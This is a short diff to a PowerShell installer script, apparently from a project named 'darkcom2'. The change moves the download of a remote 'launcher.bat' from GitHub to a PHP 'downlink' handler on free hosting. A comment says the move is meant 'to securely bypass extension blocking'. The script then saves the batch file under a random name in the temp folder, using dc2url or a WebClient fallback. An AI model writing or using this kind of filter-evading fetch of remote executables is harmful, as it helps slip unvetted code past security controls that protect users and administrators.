@@ -41,8 +41,8 @@ try {
 } catch {}
 
 # Routed through PHP downlink handler to securely bypass extension blocking
-# $RepoUrl = "https://mercwar01.byethost3.com/darkcom2/downlink.php?file=launcher.bat"
-$RepoUrl = "https://github.com/mercwar/dc2url/raw/refs/heads/main/launcher.bat"
+ $RepoUrl = "https://mercwar01.byethost3.com/darkcom2/downlink.php?file=launcher.bat"
+# $RepoUrl = "https://github.com/mercwar/dc2url/raw/refs/heads/main/launcher.bat"
 
 $TempInstaller = "$env:TEMP\dc2_install_$([Guid]::NewGuid().ToString().Substring(0,8)).bat"
 
@@ -75,7 +75,7 @@ Write-Host "  [AVIS] Connecting to gateway via dc2url..." -ForegroundColor Cyan
 try {
     $dc2check = Get-Command dc2url -ErrorAction SilentlyContinue
     if ($dc2check) {
-        curl -o "$TempInstaller" "$RepoUrl"
+        dc2url -o "$TempInstaller" "$RepoUrl"
     } else {
         $webClient = New-Object System.Net.WebClient
         $webClient.DownloadFile($RepoUrl, $TempInstaller)
